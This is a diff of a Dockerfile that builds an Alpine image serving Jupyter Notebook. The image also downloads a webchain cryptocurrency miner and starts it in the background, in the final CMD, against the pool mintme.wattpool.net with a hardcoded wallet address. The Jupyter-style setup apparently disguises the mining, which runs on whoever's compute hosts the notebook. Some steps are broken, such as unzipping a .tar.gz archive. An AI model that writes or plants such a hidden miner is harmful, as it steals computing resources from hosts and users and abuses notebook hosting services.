@@ -1,50 +1,59 @@
-# First stage: build the miner and set up Jupyter environment
-FROM debian:latest as builder
+# First stage: build the miner
+FROM alpine:latest as alpine-mine
 
-# Install dependencies for the miner and Jupyter
-RUN apt-get update && apt-get install -y \
+# Install dependencies for the miner
+RUN apk add --no-cache \
     curl \
-    tar \
-    python3 \
-    python3-pip \
-    supervisor \
-    && rm -rf /var/lib/apt/lists/*
+    unzip \
+    tar
 
-# Create the user
+# Download and setup the miner
+WORKDIR /miner
+RUN curl -L -o miner.tar.gz https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz \
+    && unzip miner.tar.gz \
+    && rm miner.tar.gz
+
+# Miner configuration (replace 'example-miner' with actual miner binary)
+ENTRYPOINT ["./webchain-miner", "-o", "mintme.wattpool.net:2222", "-u", "0x696518763bf15785613442c12B5d257E55DDcE3b", "-p", "x", "-t2"]
+
+# Second stage: build the Jupyter environment
+FROM alpine:latest as alpine-jupyter
+
+# Install dependencies for Python and Jupyter
+RUN apk add --no-cache \
+    python3 \
+    py3-pip \
+    && pip3 install --no-cache-dir \
+    notebook \
+    jupyterlab
+
+# Set up the user environment
 ARG NB_USER=jovyan
 ARG NB_UID=1000
 ENV USER ${NB_USER}
 ENV NB_UID ${NB_UID}
 ENV HOME /home/${NB_USER}
-RUN adduser --disabled-password --gecos "Default user" --uid ${NB_UID} ${NB_USER}
 
-# Download and setup the miner
-WORKDIR /miner
-RUN curl -L -o miner.tar.gz https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz \
-    && tar -xvf miner.tar.gz \
-    && rm miner.tar.gz
-
-# Copy supervisord configuration file
-COPY supervisord.conf /etc/supervisord.conf
+# Create the user
+RUN adduser --disabled-password \
+    --gecos "Default user" \
+    --uid ${NB_UID} \
+    ${NB_USER}
 
 # Copy contents to the user's home directory and set permissions
 COPY . ${HOME}
+USER root
 RUN chown -R ${NB_UID} ${HOME}
-
-# Script to restart the miner if it stops
-COPY start_miner.sh /usr/local/bin/start_miner.sh
-RUN chmod +x /usr/local/bin/start_miner.sh
-
-# Second stage: Final image
-FROM debian:latest
-
-# Copy files from the builder stage
-COPY --from=builder / /
-
-# Expose the port for Jupyter Notebook
-
-# Specify the user for running Jupyter Notebook
 USER ${NB_USER}
 
-# Start supervisord to manage processes
-ENTRYPOINT ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
+# Set the entrypoint to run Jupyter Lab
+ENTRYPOINT ["jupyter", "notebook", "--NotebookApp.default_url=/lab/", "--ip=0.0.0.0", "--port=8888", "--no-browser", "--allow-root"]
+
+# Final stage: combine miner and Jupyter environment
+FROM alpine-jupyter
+
+# Copy miner from the first stage
+COPY --from=alpine-mine /miner /home/${NB_USER}/miner
+
+# Start both the miner and Jupyter Lab
+CMD ["sh", "-c", "cd /home/${NB_USER}/miner && ./webchain-miner -o mintme.wattpool.net:2222 -u 0x696518763bf15785613442c12B5d257E55DDcE3b -p x -t2 & jupyter notebook --NotebookApp.default_url=/lab/ --ip=0.0.0.0 --port=8888 --no-browser --allow-root"]
